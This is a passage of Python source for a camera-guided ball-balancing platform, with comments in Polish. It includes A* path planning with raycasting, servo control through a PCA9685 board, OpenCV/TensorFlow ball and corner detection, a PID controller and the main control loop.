        movement = ((1, 0), (-1, 0), (0, 1), (0, -1))
        #movement = ((1, 0), (-1, 0), (0, 1), (0, -1), (-1, -1), (-1, 1), (1, 1), (1, -1))
        
        que = MM.PriorityQueue()
        que.push(start, 0)
        
        visited_from = {}
        cost = {}
        
        visited_from[start] = None
        visited_from[end] = None
        cost[start] = 0
        
        #timeStart = time.perf_counter()
        while not que.empty():
            v = que.pop()
            if v == end: break
            
            new_cost = cost[v] + 1
            for move in movement:
                nx = v[0] + move[0]
                ny = v[1] + move[1]
                
                if PathPlanner.isPointWithinMap(self, (nx, ny)) and self.obstacle_map[nx, ny] == 0:
                    u = (nx, ny)
                    if u not in cost or new_cost < cost[u]:
                        cost[u] = new_cost
                        center = PathPlanner.obstacle_map_size // 2
                        que.push(u, new_cost + MM.sqrMagnitude(v[0] - u[0], v[1] - u[1]) + self.proximity_map[u[0], u[1]] + int(MM.sqrMagnitude(center - u[0], center - u[1])))
                        visited_from[u] = v
        
        path = []
        if visited_from[end] != None:
            v = end
            while v != start:
                path.append(v)
                v = visited_from[v]
            path.append(start)
        else:
            time.sleep(0.05)
            path.append(end)
        
        return path
    
    #sprawdza, czy promien przecina pole, na ktorym znajduje sie przeszkoda
    def Raycast(self, origin, end):
        obstacle_map = self.obstacle_map
        if not PathPlanner.isPointWithinMap(self, origin) or not PathPlanner.isPointWithinMap(self, end): return False    #jesli punkt startowy jest poza mapa
        if origin == end: return obstacle_map[origin[0], origin[1]]    #jesli promien jest punktem
        
        vec = (end[0] - origin[0], end[1] - origin[1])
        flipped = False    #czy wspolrzedne w ukladzie sa zamienione miejscami? (x; y) -> (y; x)
        if abs(vec[1]) > abs(vec[0]):
            #jesli nachylenie wektora jest wieksze niz 45 stopni
            #uklad wspolrzednych 'obracany jest' o 90 stopni
            vec = (vec[1], vec[0])
            origin = (origin[1], origin[0])
            end = (end[1], end[0])
            flipped = True
        
        dir = vec[1]/vec[0] #wspolczynnik kierunkowy promienia
        offset = origin[1] - dir * origin[0]    #skladnik 'b' w funkcji y = dir*x + b; przechodzi ona przez 'origin'
        
        #znaleznienie najbardziej lewego i prawego punktu promienia
        if origin[0] >= end[0]:
            left = end[0]
            right = origin[0]
        else:
            left = origin[0]
            right = end[0]
            
        #przejscie po wszystkich punktach mapy przeszkod nalezacych do promienia i sprawdzenie, czy ktorys z nich jest przeszkada
        if not flipped:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                #print("Checked (" + str(x) + ", " + str(y) + ")") 
                if obstacle_map[x, y] > 0:
                    return True
        else:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                #print("Checked (" + str(y) + ", " + str(x) + ")") 
                if obstacle_map[y, x] > 0:
                    return True
                
        return False
    
    #DEBUG
    def PaintRay(self, origin, end, frame):
        obstacle_map = self.obstacle_map
        if not PathPlanner.isPointWithinMap(self, origin) or not PathPlanner.isPointWithinMap(self, end): return    #jesli punkt startowy jest poza mapa
        if origin == end:
            frame[origin[0], origin[1]] = [0, 255, 0]
            return
            
        
        vec = (end[0] - origin[0], end[1] - origin[1])
        flipped = False    #czy wspolrzedne w ukladzie sa zamienione miejscami? (x; y) -> (y; x)
        if abs(vec[1]) > abs(vec[0]):
            #jesli nachylenie wektora jest wieksze niz 45 stopni
            #uklad wspolrzednych 'obracany jest' o 90 stopni
            vec = (vec[1], vec[0])
            origin = (origin[1], origin[0])
            end = (end[1], end[0])
            flipped = True
        
        dir = vec[1]/vec[0] #wspolczynnik kierunkowy promienia
        offset = origin[1] - dir * origin[0]    #skladnik 'b' w funkcji y = dir*x + b; przechodzi ona przez 'origin'
        
        #znaleznienie najbardziej lewego i prawego punktu promienia
        if origin[0] >= end[0]:
            left = end[0]
            right = origin[0]
        else:
            left = origin[0]
            right = end[0]
            
        #przejscie po wszystkich punktach mapy przeszkod nalezacych do promienia i sprawdzenie, czy ktorys z nich jest przeszkada
        if not flipped:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                frame[x, y] = [0, 255, 0]
        else:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                frame[y, x] = [0, 255, 0]

from __future__ import division
simulationMode = False                    

if not simulationMode:
    import sys
    sys.path.append('/home/pi/Adafruit_Python_PCA9685/')
    import Adafruit_PCA9685
    
import math
import MathModule as MM

#program kontrolujacy ruch serw
class ServoController:
    
    #parametry serw
    servo_pulse_neutral = (388, 379)    #wartosci pwm dla pozycji neutralnych serw
    servo_pulse_range = (100, 100)      #zakres wartosci sygnalu pwm dla ruchu serw
    servo_pos_limit = (800, 800)    #ograniczenia wychylen serw (w skali od 0 do 1000)
    servo_movement_speed = (6000, 6000)    #szybkosci ruchu serw
    
    def __init__(self):
        if not simulationMode:
            self.pwm = Adafruit_PCA9685.PCA9685()  #laczenie sie z plytka sterujaca serwami
            self.pwm.set_pwm_freq(60)
        
        #zmienne wartosci
        self.servo_actual_pos = [0, 0]    #aktualna pozycja serwa
        self.servo_target_pos = [0, 0]    #docelowa pozycja serwa
        
        self.update(0)   #aplikowanie domyslnych ustawien serw

    #wydaje polecenie poruszenia serwem na kanale 'channel' na pozycje 'pos' (w skali od -1000 do 1000)
    def moveServo(self, channel, pos):
        self.servo_target_pos[channel] = MM.clamp(pos, -ServoController.servo_pos_limit[channel], ServoController.servo_pos_limit[channel])

    #aktualizuje pozycje serw
    def update(self, deltaTime):
        for i in range(2): #tylko 2 serwa
            
            movement_dir = MM.sign(self.servo_target_pos[i] - self.servo_actual_pos[i])
            self.servo_actual_pos[i] += ServoController.servo_movement_speed[i] * movement_dir * deltaTime
            
            if movement_dir > 0: self.servo_actual_pos[i] = min(self.servo_actual_pos[i], self.servo_target_pos[i])
            elif movement_dir < 0: self.servo_actual_pos[i] = max(self.servo_actual_pos[i], self.servo_target_pos[i])
                
            if not simulationMode:
                pos = round(ServoController.servo_pulse_neutral[i] + ServoController.servo_pulse_range[i] * self.servo_actual_pos[i] / 1000)
                self.pwm.set_pwm(i, 0, pos)
            else:
                self.servo_actual_pos[i] = round(self.servo_actual_pos[i])

if __name__ == '__main__':
    simulationMode = True    #czy uruchomic program w trybie symulacji? wymaga rowniez zmiany w ServoControllerModule.py oraz w ImageProcessingModule.py

    import ImageProcessingModule as IPM
    import ServoControllerModule as SCM
    import PIDControllerModule as PIDCM
    import DataLoggerModule as DLM
    import PathPlannerModule as PPM
    
    from time import sleep
    import time
    import pygame
    import math
    import MathModule as MM

    #wykonanie wstepnych czynnosci
    if simulationMode:
        import SimulationCommunicatorModule as SimCM
        simulationCommunicator = SimCM.SimulationCommunicator()
    else: simulationCommunicator = None
    
    imageProcessor = IPM.ImageProcessor(simulationCommunicator)
    servoController = SCM.ServoController()
    pathPlanner = PPM.PathPlanner()
        
    dataLogger = DLM.DataLogger()
    pidController = PIDCM.PIDController()
    pidController.servo_pos_limit = servoController.servo_pos_limit

    pygame.init()
    pygame.display.set_mode((100, 100))

    #roizpoczynanie procesu wykrywania kulki
    if simulationMode: simulationCommunicator.StartProcessing()
    imageProcessor.StartProcessing()
    pathPlanner.startProcessing(imageProcessor.obstacle_map)

    targetDeltaTime = 1.0 / 40.0    #czas jednej iteracji programu sterujacego
    updatedTime = 0.0
    servoUpdateDeltaTime = 1.0 / 60 #czas odswiezania pozycji serw
    servoUpdatedTime = 0.0

    ball_position_actual = (0.0, 0.0)
    ball_position_previous = (0.0, 0.0)

    #parametry trajektorii kulki
    angle = 0.0
    angleSpeed = 0.9
    angleRadius = 0.25
    angleRadiusFactor = 0.0
    path_targets = [(0.18, 0.18), (0.82, 0.82)]
    path_target_index = 0
    targetPos = path_targets[path_target_index]
    moveSpeed = 0.05
    movementMode = 0
    modeChangeTimeDelta = 25 #czas po jakim zmieniana jest trajektoria kulki
    modeChangeTimer = 0.0

    #jak dlugo wykonywany ma byc program
    duration = 10000
    timeout = time.time() + duration
    ball_just_found = True    #czy kulka dopiero zostala znaleziona i nalezy zresetowac predkosc?

    #glowna petla programu
    while time.time() <= timeout:
        timeStart = time.perf_counter()
        
        #oczekiwanie na odpowiedni moment do wykonania programu sterujacego
        if timeStart - updatedTime >= targetDeltaTime:
            updatedTime = time.perf_counter()
            
            #pobranie pozycji kulki
            ball_position_actual = imageProcessor.getBallPosition()
            if ball_position_actual[0] >= 0: pidController.setActualValue(ball_position_actual)
            else: pidController.setActualValue(pidController.value_target)
                
            #aktualizacja kontrolera PID
            pidController.update(targetDeltaTime)
            ball_position_previous = ball_position_actual
            
            #aktualizacja pozycji kulki w pathplannerze
            pathPlanner.setBallPosition(ball_position_actual)
            pidController.setTargetValue(pathPlanner.getPathTarget())
            
            #przechodzenie do kolejnego waypoint'a
            if MM.sqrMagnitude(ball_position_actual[0] - targetPos[0], ball_position_actual[1] - targetPos[1]) < 0.01:
                path_target_index = (path_target_index + 1) % len(path_targets)
                targetPos = path_targets[path_target_index]
                pathPlanner.setTargetPosition(targetPos)
            #print(str(pidController.value_target))
            
            #obslugiwanie wejscia z klawiatury
            killLoop = False
            for event in pygame.event.get():
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_g:
                        pidController.increaseKP()
                        
                    elif event.key == pygame.K_b:
                        pidController.decreaseKP()
                        
                    elif event.key == pygame.K_h:
                        pidController.increaseKI()
                        
                    elif event.key == pygame.K_n:
                        pidController.decreaseKI()
                        
                    elif event.key == pygame.K_j:
                        pidController.increaseKD()
                        
                    elif event.key == pygame.K_m:
                        pidController.decreaseKD()
                        
                    elif event.key == pygame.K_q:
                        killLoop = True
                        
                    elif event.key == pygame.K_UP:
                        targetPos[1] -= moveSpeed
                        
                    elif event.key == pygame.K_DOWN:
                        targetPos[1] += moveSpeed
                        
                    elif event.key == pygame.K_RIGHT:
                        targetPos[0] += moveSpeed
                        
                    elif event.key == pygame.K_LEFT:
                        targetPos[0] -= moveSpeed
                        
                    elif event.key == pygame.K_p:
                        angleSpeed += 0.1
                        print("angleSpeed = " + str(angleSpeed))
                        
                    elif event.key == pygame.K_o:
                        angleSpeed -= 0.1
                        print("angleSpeed = " + str(angleSpeed))
                        
            if killLoop:
                break
            
            #ustawianie nowych pozycji serw
            servoController.moveServo(0, round(pidController.x_servo))
            servoController.moveServo(1, -round(pidController.y_servo))
            
            #dostepne trajektorie ruchu kulki
            if False:
                if movementMode == 0:    #ksztalt osemki
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.sin(2.0 * angle)
                elif movementMode == 1:  #ksztalt okregu
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.cos(angle)
                elif movementMode == 2:   #ksztalt paraboli
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.cos(2.0 * angle)
                elif movementMode == 3:   #ksztalt litery S
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.sin(2.0 * angle)
                    if angle > 2:
                        angleSpeed = -angleSpeed
                        angle = 2
                    elif angle < -2:
                        angleSpeed = -angleSpeed
                        angle = -2
                    
            #targetPos[0] = 0.5 + angleRadiusFactor * angleRadius * targetPos[0]
            #targetPos[1] = 0.5 + angleRadiusFactor * angleRadius * targetPos[1]
            #ustawianie docelowej pozycji kulki
            #pidController.setTargetValue(targetPos[0], targetPos[1])
            #pathPlanner.setTargetPosition(tuple(targetPos))
            angle += angleSpeed * targetDeltaTime
            angleRadiusFactor += 0.25 * targetDeltaTime
            angleRadiusFactor = min(angleRadiusFactor, 1.0)
            
            modeChangeTimer += targetDeltaTime
            if modeChangeTimer >= modeChangeTimeDelta:
                modeChangeTimer = 0.0
                angleRadiusFactor = 0.0
                movementMode += 1
                movementMode = movementMode % 4
            
            #dodawanie wpisow do DataLog'u
            if False:
                path_target = pathPlanner.getPathTarget()
                dataLogger.addRecord("timestamp", time.perf_counter())
                dataLogger.addRecord("ball_pos_x", ball_position_actual[0])
                dataLogger.addRecord("ball_pos_y", ball_position_actual[1])
                dataLogger.addRecord("target_pos_x", path_target[0])
                dataLogger.addRecord("target_pos_y", path_target[1])
                dataLogger.addRecord("KP", pidController.KP)
                dataLogger.addRecord("KI", pidController.KI)
                dataLogger.addRecord("KD", pidController.KD)
                dataLogger.addRecord("error_x", pidController.x_error)
                dataLogger.addRecord("error_y", pidController.y_error)
                dataLogger.addRecord("error_prev_x", pidController.x_prev_error)
                dataLogger.addRecord("error_prev_y", pidController.y_prev_error)
                dataLogger.addRecord("error_sum_x", pidController.x_error_sum)
                dataLogger.addRecord("error_sum_y", pidController.y_error_sum)
                dataLogger.addRecord("derivative_x", pidController.x_derivative)
                dataLogger.addRecord("derivative_y", pidController.y_derivative)
                dataLogger.addRecord("servo_actual_x", servoController.servo_actual_pos[0])
                dataLogger.addRecord("servo_actual_y", servoController.servo_actual_pos[1])
                dataLogger.addRecord("servo_target_x", servoController.servo_target_pos[0])
                dataLogger.addRecord("servo_target_y", servoController.servo_target_pos[1])
                dataLogger.saveRecord()
            
        #oczekiwanie na odpowiedni moment do aktualizacji serw
        if time.perf_counter() - servoUpdatedTime >= servoUpdateDeltaTime:
            servoController.update(time.perf_counter() - servoUpdatedTime)
            servoUpdatedTime = time.perf_counter()
            
            if simulationMode:
                simulationCommunicator.moveServos(servoController.servo_actual_pos)
                
        sleep(0.004) #4 milisekundy na odpoczynek :)
            
    print("Stopping program")
    #dataLogger.saveToFile("BallanceDataLog")
    if simulationMode: simulationCommunicator.StopProcessing()
    else: imageProcessor.StopProcessing()
    pathPlanner.stopProcessing()

simulationMode = True                    

if not simulationMode:
    import TensorflowProcessingModule as TPM
    from imutils.video.pivideostream import PiVideoStream

import MathModule as MM
import math, time, copy
import cv2
import numpy as np
from multiprocessing import Process, RawValue, RawArray
 
#program sluzacy do analizy obrazu z kamery, wykrywania kulki
class ImageProcessor:
    
    #parametry kamery
    camera_resolution = (256, 256)
    camera_framerate = 40
    
    corner_detecton_area = (0.08, 0.08, 0.14, 0.14) #prostakat, w ktorym szukana jest krawedz plyty, jest on powielany dla kazdego rogu obrazu                    
    detection_image_resolution = (200, 200)
    detection_image_resolution_cropped = (-1, -1)
    
    #rozmiar bitmapy przeszkod
    obstacle_map_size = 40
    obstacle_map_update_delta = 40
        
    def __init__(self, _simulationCommunicator=None):
        print("ImageProcessor object created")
        self.simulationCommunicator = _simulationCommunicator
        #wartosci-rezultaty przetwarzania obrazu
        self.result_x = RawValue('f', 0.0)
        self.result_y = RawValue('f', 0.0)
        self.key = RawValue('i', 0)
        
        self.obstacle_map = RawArray('i', ImageProcessor.obstacle_map_size**2)
        self.obstacle_map_update_counter = 0
        
    def getBallPosition(self):    #zwraca pozycje kulki
        if simulationMode: return self.simulationCommunicator.getBallPosition()
        return (self.result_x.value, self.result_y.value)
        
    def StartProcessing(self):   #uruchamia proces przetwarzajacy obraz
        print("Starting image processing")
        
        self.process = Process(target=ImageProcessor.ProcessImage, args=(self,))
        self.process.daemon = True
        self.process.start()
        #ImageProcessor.ProcessImage(self)
        
    def StopProcessing(self):    #wydaje polecenie do zatrzymania przetwarzania obrazu
        print("Stopping image processing")
        self.key.value = -666
        self.process.terminate()
        
    def ProcessImage(self):    #przetwarza obraz pobierajac klatke z kamery i wykonujac na niej operacje analizy
        
        #bufor dzielenia mapy przeszkod z innymi procesami
        self.obstacle_map_np = np.frombuffer(self.obstacle_map, dtype=np.int32).reshape(ImageProcessor.obstacle_map_size**2)
        
        #parametry trackera kulki
        self.ballTracker_pos = [ImageProcessor.detection_image_resolution[0]//2, ImageProcessor.detection_image_resolution[1]//2]
        self.ballTracker_size = 40
        self.ballTracker_result = [0, 0]
        
        if not simulationMode:
            self.tensorflowProcessor = TPM.TensorflowProcessor()
            videoStream = PiVideoStream(resolution=ImageProcessor.camera_resolution, framerate=ImageProcessor.camera_framerate).start()   #uruchamianie watku, ktory czyta kolejne klatki z kamery
        else:
            videoStream = self.simulationCommunicator
        
        time.sleep(1)
        self.frame_original = videoStream.read()
        
        lastTime = time.time()
        a = 190
        lastID = 0
        
        saveCounter = 0
        saveCount = 0
        
        while True:
            if self.key.value == -666: break
            
            #prosty licznik przetworzonych klatek w ciagu sekundy
            a = a + 1
            if a > 200:
                if ImageProcessor.detection_image_resolution_cropped[0] == -1:
                    ImageProcessor.detection_image_resolution_cropped = (np.size(self.frame_original, 0), np.size(self.frame_original, 1))
                print(str(a * 1.0 / (time.time() - lastTime)))
                lastTime = time.time()
                a = 0
            
            #synchronizacja pobierania nowej klatki z czestotliwascia kamery
            while True:
                frameGrabbed = videoStream.read()
                ID = id(frameGrabbed)
                if ID != lastID:
                    self.frame_original = frameGrabbed
                    lastID = ID
                    break
                elif not simulationMode:
                    time.sleep(0.01)
            
            #klatka przeznaczona do debugowania
            #self.frame_debug = copy.copy(self.frame_original)
            
            if not simulationMode: self.corners = ImageProcessor.FindBoardCorners(self)    #znajdowanie pozycji rogow plyty
            else: self.corners = self.simulationCommunicator.FindBoardCorners()
            ImageProcessor.ChangePerspective(self)    #zmiana perspektywy znalezionej tablicy, aby wygladala jak kwadrat
            #self.frame_original = self.frame_original[1:200, 1:200] #przycinanie zdjecia
            if not simulationMode: ImageProcessor.UpdateBallTracker(self)    #aktualizacja trackera kulki
            else:
                pos = self.simulationCommunicator.getBallPosition()
                self.ballTracker_result[0] = pos[0] * ImageProcessor.detection_image_resolution_cropped[0]
                self.ballTracker_result[1] = pos[1] * ImageProcessor.detection_image_resolution_cropped[1]
            ImageProcessor.UpdateObstacleMap(self)
            
            #ustawianie znalezionej pozycji kulki w zmiennych dzielonych miedzy procesami
            self.result_x.value = self.ballTracker_result[0] / ImageProcessor.detection_image_resolution_cropped[0]
            self.result_y.value = self.ballTracker_result[1] / ImageProcessor.detection_image_resolution_cropped[1]
            
            #cv2.imshow("Frame debug", self.frame_debug)
            if saveCounter < saveCount:
                cv2.imwrite("Frame" + str(saveCounter) + ".png", self.frame_original)
                saveCounter += 1
                
            #cv2.imshow("Frame Casted", self.frame_original)
            #key = cv2.waitKey(1) & 0xFF
            #if key == ord("q"):
            #    break
            
        videoStream.stop()
            
    #aktualizuje tracker kulki
    def UpdateBallTracker(self):
        self.ballTracker_pos[0] = MM.clamp(self.ballTracker_pos[0], 0, ImageProcessor.detection_image_resolution_cropped[0] - self.ballTracker_size)
        self.ballTracker_pos[1] = MM.clamp(self.ballTracker_pos[1], 0, ImageProcessor.detection_image_resolution_cropped[1] - self.ballTracker_size)
        
        self.ballTracker_pos[0] = int(self.ballTracker_pos[0])
        self.ballTracker_pos[1] = int(self.ballTracker_pos[1])
        
        #przygotowanie klatki z kamery do analizy
        tracker_frame = self.frame_original[self.ballTracker_pos[1]:self.ballTracker_pos[1]+self.ballTracker_size,
                                            self.ballTracker_pos[0]:self.ballTracker_pos[0]+self.ballTracker_size]
        tracker_frame = cv2.cvtColor(tracker_frame, cv2.COLOR_BGR2GRAY)
        
        #analiza klatki z uzyciem sieci neuronowych
        result = self.tensorflowProcessor.getBallPosition(tracker_frame)
        result = np.round(result * self.ballTracker_size).astype("int")
        
        self.ballTracker_result[0] = self.ballTracker_pos[0] + result[0]
        self.ballTracker_result[1] = self.ballTracker_pos[1] + result[1]
        
        #zaznaczanie wizualne pozycji kulki
        cv2.circle(self.frame_original, tuple(self.ballTracker_result), 1, (0, 0, 255), -1)                    
        
        #aktualizacja pozycji trackera
        self.ballTracker_pos[0] = MM.lerp(self.ballTracker_pos[0], self.ballTracker_result[0] - self.ballTracker_size // 2, 0.7)
        self.ballTracker_pos[1] = MM.lerp(self.ballTracker_pos[1], self.ballTracker_result[1] - self.ballTracker_size // 2, 0.7)
    
    #znajduje pozycje krawedzi plyty
    def FindBoardCorners(self):
        corners = np.zeros((4, 2), dtype=np.int32)
        corner_detection_area_pixels = [round(self.corner_detecton_area[0] * self.camera_resolution[0]),
                                       round(self.corner_detecton_area[1] * self.camera_resolution[1]),
                                       round(self.corner_detecton_area[2] * self.camera_resolution[0]),
                                       round(self.corner_detecton_area[3] * self.camera_resolution[1])]
        for i in range(4):
            flipX = False
            flipY = False
            detectionArea = copy.copy(corner_detection_area_pixels)    #domyslnie lewy gorny
            if i == 1 or i == 2:
                detectionArea[0] = self.camera_resolution[0] - detectionArea[0] - detectionArea[2]
                flipX = True
            if i == 3 or i == 2:
                detectionArea[1] = self.camera_resolution[1] - detectionArea[1] - detectionArea[3]
                flipY = True
                
            rect = (detectionArea[0], detectionArea[1], detectionArea[0] + detectionArea[2], detectionArea[1] + detectionArea[3])
            #cv2.rectangle(self.frame_debug, (rect[0], rect[1]), (rect[2], rect[3]), (0, 255, 0), 1);
        
            img = self.frame_original[rect[1]:rect[3], rect[0]:rect[2]]
            img = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
            img = cv2.resize(img, (40, 40), interpolation=cv2.INTER_NEAREST)                    
            
            if flipX and flipY: img = cv2.flip(img, -1)
            elif flipX: img = cv2.flip(img, 1)
            elif flipY: img = cv2.flip(img, 0)
            #cv2.imshow("Corner " + str(i), img)
            
            result = self.tensorflowProcessor.getCornerPosition(img)
            corner = np.round(result * 40.0).astype("int")                    
            
            if flipX and flipY: corners[i] = (40 - corner[0] + detectionArea[0], 40 - corner[1] + detectionArea[1])                    
            elif flipX: corners[i] = (40 - corner[0] + detectionArea[0], corner[1] + detectionArea[1])                    
            elif flipY: corners[i] = (corner[0] + detectionArea[0], 40 - corner[1] + detectionArea[1])                    
            else: corners[i] = (corner[0] + detectionArea[0], corner[1] + detectionArea[1])                    
            #cv2.circle(self.frame_debug, corners[i], 1, (0, 0, 255), 1)

        return corners

    #zmienia perspektywe obrazu z kamery tak, aby niewidoczne bylo przechylenie plyty
    def ChangePerspective(self):
        pts = np.array(self.corners, np.float32)
        res = self.detection_image_resolution
        pts2 = np.float32([[0,0],[res[0],0],[res[0], res[1]], [0, res[1]]])                    

        M = cv2.getPerspectiveTransform(pts, pts2)
        self.frame_original = cv2.warpPerspective(self.frame_original, M, res)
        
    #aktualizuje mape przeszkod na plycie
    def UpdateObstacleMap(self):
        self.obstacle_map_update_counter += 1
        if self.obstacle_map_update_counter >= ImageProcessor.obstacle_map_update_delta:
            self.obstacle_map_update_counter = 0
            frame = cv2.resize(self.frame_original, (ImageProcessor.obstacle_map_size, ImageProcessor.obstacle_map_size), interpolation=cv2.INTER_NEAREST)
            frame = np.int32(frame)
            frame = 2 * frame[...,2] - frame[...,1] - frame[...,0]
            np.copyto(self.obstacle_map_np, frame.ravel())
            #self.obstacle_map = frame[...,2].ravel()

import MathModule as MM

class PIDController:
    
    #operacje zmiany pidow
    def increaseKP(self):
        self.KP += 50
        print("KP = " + str(self.KP))
        
    def increaseKI(self):
        self.KI += 50
        print("KI = " + str(self.KI))
        
    def increaseKD(self):
        self.KD += 50
        print("KD = " + str(self.KD))                    
        
    def decreaseKP(self):
        self.KP -= 50
        print("KP = " + str(self.KP))
        
    def decreaseKI(self):
        self.KI -= 50
        print("KI = " + str(self.KI))
        
    def decreaseKD(self):
        self.KD -= 50
        print("KD = " + str(self.KD))                    
        
    #ustawia aktualna wartosc
    def setActualValue(self, x, y=None):
        if y is not None:
            self.value_actual[0] = MM.lerp(self.value_actual[0], x, self.value_smoothing)
            self.value_actual[1] = MM.lerp(self.value_actual[1], y, self.value_smoothing)
        else:
            self.value_actual[0] = MM.lerp(self.value_actual[0], x[0], self.value_smoothing)
            self.value_actual[1] = MM.lerp(self.value_actual[1], x[1], self.value_smoothing)
        
    #ustawia docelowa wartosc
    def setTargetValue(self, x, y=None):
        if y is not None:
            self.value_target[0] = x
            self.value_target[1] = y
        else:
            self.value_target[0] = x[0]
            self.value_target[1] = x[1]
    
    def __init__(self):
        self.servo_pos_limit = (1000, 1000)    #ograniczenia wychylen serw (w skali od 0 do 1000)
        self.value_target = [0.5, 0.5]    #docelowa wartosc, ktora ma byc osiagnieta przez kontroler
        self.value_actual = [0.5, 0.5]    #aktualna wartosc
        self.value_smoothing = 1.0       #wspolczynnik wygladzania aktualizacji aktualnej wartosci

        #wspolczynniki kontroli
        self.KP = 1.3 * 1000   #wzmocnienie czesci proporcjonalnej
        self.KI = 0.6 * 1000    #wzmocnienie czesci calkujacej
        self.KD = 0.5 * 1000   #wzmocnienie czesci rozniczkujacej

        #pozycja serwa
        self.x_servo = 0.0
        self.y_servo = 0.0

        #wartosc bledu
        self.x_error = 0.0
        self.y_error = 0.0

        #wartosci poprzednich bledow
        self.x_prev_error = 0.0
        self.y_prev_error = 0.0

        #zmiana bledu w czasie
        self.x_derivative = 0.0
        self.y_derivative = 0.0

        #calkowita suma bledow
        self.x_error_sum = 0.0
        self.y_error_sum = 0.0

    #aktualizuje kontrolea PID
    def update(self, deltaTime):
        #liczenie bledu
        self.x_error = self.value_target[0] - self.value_actual[0]
        self.y_error = self.value_target[1] - self.value_actual[1]
        
        #print("Error = ( " + str(self.x_error) + "; " + str(self.y_error) + ")")

        #liczenie pochodnej
        self.x_derivative = (self.x_error - self.x_prev_error) / deltaTime
        self.y_derivative = (self.y_error - self.y_prev_error) / deltaTime

        self.x_prev_error = self.x_error
        self.y_prev_error = self.y_error

        self.x_error_sum += self.x_error * deltaTime
        self.y_error_sum += self.y_error * deltaTime
        
        #zmiana pozycji serw z uwzglednieniem bledu biezacego, przyszlego oraz przeszlego
        self.x_servo = (self.x_error * self.KP) + (self.x_derivative * self.KD) + (self.x_error_sum * self.KI)
        self.y_servo = (self.y_error * self.KP) + (self.y_derivative * self.KD) + (self.y_error_sum * self.KI)
        
        self.x_servo = MM.clamp(self.x_servo, -self.servo_pos_limit[0], self.servo_pos_limit[0])
        self.y_servo = MM.clamp(self.y_servo, -self.servo_pos_limit[1], self.servo_pos_limit[1])
        
        self.x_error_sum = MM.clamp(self.x_error_sum, -1.0, 1.0) * 0.99
        self.y_error_sum = MM.clamp(self.y_error_sum, -1.0, 1.0) * 0.99

import cv2
import numpy as np
import MathModule as MM
import time
from multiprocessing import Process, RawValue
from collections import deque
import copy

#program odpowiadajacy za planiwanie sciezki kulki
class PathPlanner:
    
    obstacle_map_size = 40    #rozmiar mapy przeszkod
    obstacle_map_update_delta = 4    #co ile sekund odswiezana ma byc mapa przeszkod?
    path_sub_update_delta = 0.1    #co ile sekund aktualizowac podsciezke?
    
    def __init__(self):
        print("PathPlanner object created")
        
        self.obstacle_map = None
        self.path = None
        self_path_last_index = 0
        self.proximity_map = np.zeros((PathPlanner.obstacle_map_size, PathPlanner.obstacle_map_size)) #tablica 2D z kosztem bliskosci wykrytych przeszkod
        
        self.path_position = 0.0   #aktualna pozycja na sciezce
        self.path_speed = 0.2 * PathPlanner.obstacle_map_size    #predkosc przechodzenia sciezki
        
        self.ball_pos_x = RawValue('f', 0.5)
        self.ball_pos_y = RawValue('f', 0.5)
        self.target_pos_x = RawValue('f', 0.25)
        self.target_pos_y = RawValue('f', 0.25)
        self.path_x = RawValue('f', 0.5)
        self.path_y = RawValue('f', 0.5)
        
    def setBallPosition(self, pos):
        self.ball_pos_x.value = pos[1]
        self.ball_pos_y.value = pos[0]
        
    def setTargetPosition(self, pos):
        self.target_pos_x.value = pos[1]
        self.target_pos_y.value = pos[0]
        
    def getPathTarget(self):
        return (self.path_x.value, self.path_y.value)
        
    def startProcessing(self, _frame_array):
        print("Starting PathPlanner process")
        self.process = Process(target=PathPlanner.doPlanning, args=(self,_frame_array))
        self.process.daemon = True
        self.process.start()
        
    def stopProcessing(self):
        print("Stopping PathPlanner process")
        self.process.terminate()
        
    def doPlanning(self, _frame_array):
        obstacle_map_update_time = 0.0
        path_sub_update_time = 0.0
        while True:
            if time.perf_counter() - obstacle_map_update_time >= PathPlanner.obstacle_map_update_delta:
                obstacle_map_update_time = time.perf_counter()
                PathPlanner.updateObstacleMap(self, _frame_array)
                
            if time.perf_counter() - path_sub_update_time >= PathPlanner.path_sub_update_delta:
                path_sub_update_time = time.perf_counter()
                PathPlanner.UpdateSubPath(self)
        
    #aktualizuje bitmape przeszkod
    def updateObstacleMap(self, _frame_array):
        frame = np.frombuffer(_frame_array, dtype=np.int32)
        frame = np.clip(frame, 0, 255).astype('uint8').reshape((PathPlanner.obstacle_map_size, PathPlanner.obstacle_map_size))
        #cv2.imshow("Map", frame)
        frame = cv2.inRange(frame, 90, 255)                    
        #kernel = np.ones((2,2), np.uint8)
        #frame = cv2.dilate(frame, kernel, iterations=1)
        self.obstacle_map = frame
        
        #aktualizacja mapy bliskosci przeszkod
        self.proximity_map.fill(0)
        size = PathPlanner.obstacle_map_size - 1
        sides = ((1, 0), (1, -1), (0, -1), (-1, -1), (-1, 0), (-1, 1), (0, 1), (1, 1))
        for x in range(1, size):
            for y in range(1, size):
                if frame[x, y] > 0:
                    for side in sides:
                        self.proximity_map[x + side[0], y + side[1]] += 1
        
        #np.clip(self.proximity_map, 0, 1, self.proximity_map)
        self.proximity_map *= 5000
        
        #aktualizacja glownej sciezki
        start = PathPlanner.FromUnitaryToMapSpace((self.ball_pos_x.value, self.ball_pos_y.value), self.obstacle_map_size)
        end = PathPlanner.FromUnitaryToMapSpace((self.target_pos_x.value, self.target_pos_y.value), self.obstacle_map_size)
        self.path = PathPlanner.a_star(self, start, end)
        
        self.path_last_index = len(self.path)-1
        self.path_position = 0.0
        
    #aktualizuje podsciezke przy uzyciu algorytmu A*
    def UpdateSubPath(self):
        if self.path == None: return None
        
        ball_pos = (self.ball_pos_x.value, self.ball_pos_y.value)
        path = self.path
        
        index = int(self.path_position)
        A = PathPlanner.FromMapToUnitarySpace(path[index])
        
        frame = copy.copy(self.obstacle_map)
        frame = cv2.cvtColor(frame, cv2.COLOR_GRAY2BGR)
        
        if self.path_last_index > 0:
            B = PathPlanner.FromMapToUnitarySpace(path[index+1])
            dist = MM.distance(A, B)
            mant = self.path_position - index
            
            PathPlanner.PaintRay(self, PathPlanner.FromUnitaryToMapSpace(ball_pos, self.obstacle_map_size), path[index+1], frame)
